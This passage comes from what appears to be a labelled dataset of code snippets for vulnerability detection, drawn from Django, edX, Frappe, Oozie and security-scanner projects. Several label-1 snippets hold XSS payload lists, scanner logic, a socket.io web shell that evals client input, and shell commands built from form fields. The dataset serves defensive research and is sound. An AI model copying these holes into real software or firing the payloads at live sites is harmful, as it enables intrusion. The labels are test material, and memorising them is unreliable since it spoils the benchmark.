\t\t\t\tand key in(d.fieldname for d in self", "label": 0}, {"snippet_id": 939, "code": ".text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) xss_result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(payload)", "label": 1}, {"snippet_id": 55037, "code": "') @require_POST @require_AJAX @transaction.atomic def batch_edit_translations(request): \"\"\"Perform an action on a list of translations. Available actions are defined in `ACTIONS_FN_MAP`. Arguments to this", "label": 0}, {"snippet_id": 40390, "code": ".doctype, self.name, new_password, df.fieldname) \t\t\t\t \t\t\t\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and", "label": 0}, {"snippet_id": 1728, "code": ", 'Description': vul['Description'], 'remediation': vul['remediation'] } vul_list.append(all_data) break except: pass print vul_list return vul_list @app.route('/alerts/<scanid>', methods=['GET']) def return_alerts", "label": 0}, {"snippet_id": 51206, "code": "(resources.ModelResource): class Meta: model=Group class UserAdmin(BaseUserAdmin, ImportExportModelAdmin): resource_class=UserResource inlines=(DashboardUserInline,) list_display=('username', 'first_name', ", "label": 0}, {"snippet_id": 49814, "code": " size=3 color=black>[\"+data+\"]</font>\"; try{ output=eval(data)+\"\" } catch(e){ output=e+\"\" } socket.emit('sendMSG',output) }) </script> ''' @app.route('/',methods=['GET']) def shell(): return html @socketio", "label": 1}, {"snippet_id": 364, "code": " payload) xss_request=req.api_request(xss_url,\"GET\",headers) if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s", "label": 1}, {"snippet_id": 1735, "code": " 'remediation': vul['remediation'] } vul_list.append(all_data) break except: pass print vul_list return vul_list @app.route('/alerts/<scanid>', methods=['GET']) def return_alerts(scanid): print \"ScanID", "label": 0}, {"snippet_id": 52631, "code": "] in('hive', 'hive2'): parameters=parameters.union(set(find_dollar_braced_variables(data))) elif node_data['type']=='pig': parameters=parameters.union(set(find_dollar_variables(data))) response['status", "label": 0}, {"snippet_id": 40687, "code": " fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map", "label": 0}, {"snippet_id": 44035, "code": " elasticsearch_dsl.query import SimpleQueryString, Bool class RTDFacetedSearch(FacetedSearch): \"\"\"Overwrite the initialization in order too meet our needs\"\"\" def __init__(self, using, index, doc_types, model, fields", "label": 1}, {"snippet_id": 49588, "code": "=query_params or{} self.list_display=list_display or[] self.list_filter=list_filter or[] self.list_search=list_search or[] self.search_query_value=self.query_params.get(search_query_param, '') self.search_query_param", "label": 0}, {"snippet_id": 17762, "code": "', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete", "label": 0}, {"snippet_id": 35066, "code": " \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format", "label": 0}, {"snippet_id": 30502, "code": " \"sudo cat %s |tail -%s %s %s\" %(local_path_logs, rows, grep_act, grep)]\t \t\t \tfunct.ssh_command(syslog_server, commands, show_log=\"1\") \t if serv is not None and form.getvalue('rows1') is not None: \trows", "label": 0}, {"snippet_id": 19389, "code": ") ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file", "label": 0}, {"snippet_id": 35616, "code": " \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format", "label": 0}, {"snippet_id": 13548, "code": "'modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>", "label": 0}, {"snippet_id": 16999, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 51688, "code": "='en-us' TIME_ZONE='UTC' USE_I18N=True USE_L10N=True USE_TZ=True LOCALE_PATHS=['locale'] LANGUAGE_COOKIE_NAME='dashboard_language' STATIC_URL='/static/' if DEBUG: STATIC_ROOT='static' else: STATIC_ROOT", "label": 0}, {"snippet_id": 52826, "code": " request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=", "label": 0}, {"snippet_id": 36499, "code": " \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters", "label": 0}, {"snippet_id": 33456, "code": " in self.signatures.keys(): \t\t\tfor sig in self.signatures[injection_types]: \t\t\t\tmatch=re.findall(re.escape(sig), response) \t\t\t\tif match and any(x in payload for x in \"><\"): \t\t\t\t\tself.found(injection_types", "label": 1}, {"snippet_id": 5485, "code": " 'onwebkitsourceopen', 'onwebkitspeechchange', 'onwebkittransitionend', 'onwheel' ] _htmlTemplate=''' <!DOCTYPE html> <html> <head> <title>XSS Fuzzer</title> <meta http-equiv=\"Content-Type\" content=\"text", "label": 0}, {"snippet_id": 34954, "code": ".name: \t\t\t \t\t\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True)", "label": 0}, {"snippet_id": 27344, "code": " from google_cloud_utils import storage from libs import auth from libs import form from libs import helpers from system import environment def add_jinja2_filter(name, fn): _JINJA_ENVIRONMENT.filters[name", "label": 0}, {"snippet_id": 53601, "code": " bundle, properties): try: deployment_mapping={} coords=dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])])", "label": 0}, {"snippet_id": 28278, "code": " cfg, just_save=save) \t\t \tfunct.diff_config(oldcfg, cfg) \t \t \t \t \t \t\t \tos.system(\"/bin/rm -f \" +hap_configs_dir +\"*.old\") template=template.render(h2=1, title=\"Working with HAProxy configs\", \t\t\t\t\t\t\trole", "label": 0}, {"snippet_id": 50891, "code": " Remaining args will be arguments for `cmd`. Kwargs: options(dict): These are ignored for oob commands. Use command arguments(which can hold dicts) to send instructions to the client instead. \"\"\" if not cmdname", "label": 0}, {"snippet_id": 39406, "code": " db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t", "label": 0}, {"snippet_id": 20946, "code": "-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'", "label": 0}, {"snippet_id": 21789, "code": "+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history", "label": 0}, {"snippet_id": 26086, "code": ".invoice_address_company_required and not self.all_optional: self.initial['is_business']=True self.fields['is_business'].widget=BusinessBooleanRadio(require_business=True) self.fields['company'].required=True", "label": 0}, {"snippet_id": 30386, "code": "\texcept requests.exceptions.RequestException as err: \t\tprint(\"OOps: Something Else\",err) \t\t \tdata=response.content \tprint(data.decode('utf-8')) if serv is not None and form.getvalue('rows') is not None: ", "label": 0}, {"snippet_id": 6273, "code": " return res @property def debug(self): \"\"\" Set to True to log debug messages(boolean). \"\"\" return self.config.getboolean(self.section, 'debug') @property def syslog_debug(self): \"\"\" Set to True to log debug", "label": 0}, {"snippet_id": 9550, "code": "+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading", "label": 0}, {"snippet_id": 22153, "code": " url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', ", "label": 0}, {"snippet_id": 27483, "code": " add_jinja2_filter('splitlines', splitlines) add_jinja2_filter('split_br', split_br) add_jinja2_filter('polymer_tag', lambda v: '{{%s}}' % v) def add_menu(name, href): \"\"\"Add menu item to the main navigation.\"", "label": 0}, {"snippet_id": 25737, "code": ".TYPE_STRING: field=forms.CharField( label=q.question, required=q.required, help_text=help_text, initial=initial.answer if initial else None, ) elif q.type==Question.TYPE_TEXT: field=forms.CharField( label", "label": 0}, {"snippet_id": 11276, "code": ") self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/", "label": 0}, {"snippet_id": 19165, "code": "}' \" \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR", "label": 0}, {"snippet_id": 45097, "code": " %(workflow,), detail=detail) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) def list_editor_coordinators(request): coordinators=[d.content_object for d in Document.objects", "label": 0}, {"snippet_id": 52259, "code": ", id=job['id']) name=doc2.name +'-copy' copy_doc=doc2.doc.get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request.user doc2.save", "label": 0}, {"snippet_id": 10216, "code": "(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self", "label": 1}, {"snippet_id": 28250, "code": " as conf: \t\t\tconf.write(config) \texcept IOError: \t\terror=\"Can't read import config file\" \t \tMASTERS=sql.is_master(serv) \tfor master in MASTERS: \t\tif master[0] !=None: \t\t\tfunct.upload_and_restart(master[0", "label": 0}, {"snippet_id": 53121, "code": "(coordinator_data) coordinator_doc.name=coordinator_data['name'] coordinator_doc.save() response['status']=0 response['id']=coordinator_doc.id response['message']=_('Saved !') return HttpResponse(json.dumps", "label": 0}, {"snippet_id": 4879, "code": "<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\", ] _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert('xss')>\", '<<script>alert", "label": 1}, {"snippet_id": 10260, "code": " def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): ", "label": 0}, {"snippet_id": 40850, "code": "\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t", "label": 0}, {"snippet_id": 52865, "code": "=submission.run() return job_id except RestException, ex: detail=ex._headers.get('oozie-error-message', ex) if 'Max retries exceeded with url' in str(detail): detail='%s: %s' %(_('The Oozie server is not", "label": 0}, {"snippet_id": 19187, "code": "=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement", "label": 0}, {"snippet_id": 43741, "code": "\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field(fieldname) \t\tif meta_df and meta_df.get(\"__print_hide\"): \t\t\treturn True \t\tprint_hide=0 \t\tif self", "label": 0}, {"snippet_id": 43656, "code": " frappe.utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) \t\tif not df and fieldname in default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname", "label": 0}, {"snippet_id": 8347, "code": ", ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),", "label": 0}, {"snippet_id": 20022, "code": "(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg=colorize('green'", "label": 0}, {"snippet_id": 12725, "code": "'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete')", "label": 0}, {"snippet_id": 24821, "code": " running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print", "label": 0}, {"snippet_id": 2021, "code": " \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate", "label": 0}, {"snippet_id": 2567, "code": " xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=',", "label": 0}, {"snippet_id": 29069, "code": " \tif error: \t\tprint('error: '+error) \t\t \tos.system(\"rm -f %s\" % script) \tssh_command(serv, commands, print_out=\"1\") \t \tif kwargs.get('syn_flood')==\"1\": \t\tsyn_flood_protect(serv) \t def syn_flood_protect", "label": 0}, {"snippet_id": 41933, "code": "): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif", "label": 0}, {"snippet_id": 30937, "code": ">Can\\'t read import config file</div>') \t\t \tfrom jinja2 import Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols']) \ttemplate", "label": 1}, {"snippet_id": 27468, "code": ", extensions=['jinja2.ext.autoescape'], autoescape=True) _MENU_ITEMS=[] add_jinja2_filter('json', encode_json) add_jinja2_filter('format_time', format_time) add_jinja2_filter('splitlines', splitlines) add_jinja2_filter", "label": 0}, {"snippet_id": 1316, "code": " records=db.vulnerabilities.find({\"scanid\":scanid}) print \"Records are \",records if records: for data in records: print \"Data is\",data if data['req_body']==None: data['req_body']=\"NA\" data.pop('_id') try", "label": 0}, {"snippet_id": 42093, "code": " convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta", "label": 0}, {"snippet_id": 26137, "code": "'name_parts']=NamePartsFormField( max_length=255, required=event.settings.invoice_name_required and not self.all_optional, scheme=event.settings.name_scheme, label=_('Name'), initial=(self.instance.name_parts", "label": 0}, {"snippet_id": 9753, "code": "='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 26940, "code": "[hidden_param_name[i]]=hidden_param_value[i] if method.find(\"get\")==0: r=requests.get(url=furl, params=post_params) else: r=requests.post(furl, data=post_params) if DEBUG==1: print post_params with open(\"response_\"", "label": 0}, {"snippet_id": 52478, "code": "=properties response['workflows']=workflows return HttpResponse(json.dumps(response), mimetype=\"application/json\") def _get_workflows(user): return[{ 'name': workflow.name, 'owner': workflow.owner.username", "label": 0}, {"snippet_id": 7363, "code": ": urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern", "label": 0}, {"snippet_id": 24240, "code": " from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure", "label": 0}, {"snippet_id": 20789, "code": ".password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done", "label": 0}, {"snippet_id": 812, "code": " vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") print \"all params\",vul_param def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url", "label": 1}, {"snippet_id": 28924, "code": "=ssh_connect(serv) \ttry: \t\tsftp=ssh.open_sftp() \t\tsftp.get(config_path, cfg) \t\tsftp.close() \t\tssh.close() \texcept Exception as e: \t\tssh=str(e) \t\treturn ssh \t def diff_config(oldcfg, cfg): \tlog_path=get_config_var", "label": 0}, {"snippet_id": 53, "code": " check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain'in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def", "label": 1}, {"snippet_id": 52401, "code": " if subworkflows: dependencies=Document2.objects.filter(uuid__in=subworkflows) workflow_doc.dependencies=dependencies workflow_doc.update_data({'workflow': workflow}) workflow_doc.update_data({'layout'", "label": 0}, {"snippet_id": 311, "code": " 'application/json' or 'text/plain'in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_method(url,method,headers,body,scanid=None): result='' url_query", "label": 1}, {"snippet_id": 14985, "code": ".verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests", "label": 0}, {"snippet_id": 16905, "code": "\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$", "label": 0}, {"snippet_id": 1020, "code": " result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: print \"param to test\",key parsed_url=urlparse.urlparse(url", "label": 1}, {"snippet_id": 35964, "code": " and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor", "label": 1}, {"snippet_id": 5417, "code": "'onfocus', 'onfocusin', 'onfocusout', 'onhashchange', 'oninput', 'oninvalid', 'onkeydown', 'onkeypress', 'onkeyup', 'onload', 'onloadeddata', 'onloadedmetadata', 'onloadstart', 'onmessage', 'onmousedown", "label": 0}, {"snippet_id": 12553, "code": "/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups", "label": 0}, {"snippet_id": 49191, "code": " get_remove_sort_by(self): new_query=[] for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if not int(c)==self.column_id: new_query.append(column) return self.get_url_with_query_params({ self", "label": 0}, {"snippet_id": 35189, "code": "\t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df", "label": 0}, {"snippet_id": 14648, "code": " expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite", "label": 0}, {"snippet_id": 27977, "code": " from libs import handler from libs import helpers from metrics import logs SESSION_EXPIRY_DAYS=14 class Handler(base_handler.Handler): \"\"\"Login page.\"\"\" @handler.unsupported_on_local_server @handler.get", "label": 0}, {"snippet_id": 53812, "code": " url from pyquery import PyQuery from bs4 import BeautifulSoup import requests class Xss: def main(): user_dork=str(input(\"[Input Dork] >_ \")) req=url.PoolManager() send=req.request(\"GET\", \"http://www1", "label": 1}, {"snippet_id": 53797, "code": ".com/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x=str(input(\"[Input Script] >_ \")) print(str(result", "label": 1}, {"snippet_id": 28763, "code": "\t\timport sys \t\tsys.exit() \t\t\t\t def ssh_connect(serv, **kwargs): \timport paramiko \tfrom paramiko import SSHClient \timport sql \tfullpath=get_config_var('main', 'fullpath') \tssh_enable='' \tssh_port='' \tssh_user_name", "label": 0}, {"snippet_id": 6059, "code": ", 'server_key': None, 'cert_chain': None, 'userdb_mongo_uri': None, 'userdb_mongo_database': None, 'sso_session_lifetime': '15', 'sso_session_mongo_uri': None, 'raven_dsn': None, 'content_packages':[],", "label": 0}, {"snippet_id": 53239, "code": ":editor_submit_coordinator', kwargs={'doc_id': coordinator.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_coordinator(request, coordinator", "label": 0}, {"snippet_id": 19751, "code": " test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest", "label": 0}, {"snippet_id": 34258, "code": ") \t\tself.dont_update_if_missing=[] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn", "label": 0}, {"snippet_id": 10023, "code": " command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='", "label": 0}, {"snippet_id": 12766, "code": "-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login',", "label": 0}, {"snippet_id": 52287, "code": ".doc.all().delete() doc2.doc.add(copy_doc) workflow=Workflow(document=doc2) workflow.update_name(name) doc2.update_data({'workflow': workflow.get_data()['workflow']}) doc2.save() workflow.set_workspace", "label": 0}, {"snippet_id": 3635, "code": " scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid)", "label": 0}, {"snippet_id": 9558, "code": "'open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 42514, "code": "(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe", "label": 0}, {"snippet_id": 45265, "code": "']) else: coordinator_doc=Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user) Document.objects.link(coordinator_doc, owner", "label": 0}, {"snippet_id": 11837, "code": " 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0", "label": 0}, {"snippet_id": 39074, "code": "\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_", "label": 0}, {"snippet_id": 38977, "code": "'__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname", "label": 0}, {"snippet_id": 9505, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/", "label": 0}, {"snippet_id": 51711, "code": " JET_SIDE_MENU_ITEMS=[ {'label': _('\ud83d\udd27 Configuration'), 'items':[ {'name': 'auth.user'}, {'name': 'auth.group'}, {'name': 'constance.config', 'label': _('Configuration')}, ]}, {'label': _('Dashboard'), 'items':[ {'name'", "label": 1}, {"snippet_id": 38541, "code": " cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", \"\").replace(\"-\", \"\") \t\t\tif hasattr(module", "label": 0}, {"snippet_id": 12235, "code": "/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"", "label": 1}, {"snippet_id": 50842, "code": " prompt else \"text\" if raw: args[0]=text else: args[0]=parse_html(text, strip_ansi=nocolor) self.client.lineSend(self.csessid,[cmd, args, kwargs]) def send_prompt(self, *args, **kwargs): kwargs[\"options", "label": 0}, {"snippet_id": 37061, "code": "\tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2", "label": 0}, {"snippet_id": 13918, "code": "]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name", "label": 0}, {"snippet_id": 38258, "code": "] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape", "label": 0}, {"snippet_id": 23559, "code": "'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS", "label": 0}, {"snippet_id": 44276, "code": ") }) @check_document_access_permission() def edit_workflow(request): workflow_id=request.GET.get('workflow') if workflow_id: wid={} if workflow_id.isdigit(): wid['id']=workflow_id else: wid['uuid']=workflow_id", "label": 1}, {"snippet_id": 47715, "code": ">\" return a def check_password_conformity(pw1: str, pw2: str): if not(pw1==pw2): return False if len(pw1) < 6: return False if pw1.isupper(): return False if pw1.islower(): return False return True def", "label": 0}, {"snippet_id": 6041, "code": "': '0.0.0.0', 'listen_port': '8088', 'pysaml2_config': 'idp_conf.py', 'fticks_secret_key': None, 'fticks_format_string': 'F-TICKS/SWAMID/2.0 'static_dir': None, 'ssl_adapter': 'builtin', 'server_cert':", "label": 0}, {"snippet_id": 30239, "code": "('stats_port') \tstats_page=sql.get_setting('stats_page') \t \tpostdata={ \t\t'action': form.getvalue('action'), \t\t's': form.getvalue('s'), \t\t'b': form.getvalue('b') \t} \theaders={ \t\t'User-Agent': 'Mozilla/5", "label": 0}, {"snippet_id": 52000, "code": " PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import RestException from desktop.models import Document, Document2 from liboozie.credentials import Credentials", "label": 0}, {"snippet_id": 49137, "code": ".get_url_with_query_params({ self.ordering_query_param: self.column_id }) elif self.current_columns_length > 1: new_query=[] for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if not int(c", "label": 0}, {"snippet_id": 50925, "code": " from django.contrib.auth.admin import GroupAdmin as BaseGroupAdmin from django.contrib.auth.admin import UserAdmin as BaseUserAdmin from django.contrib.auth.models import Group, 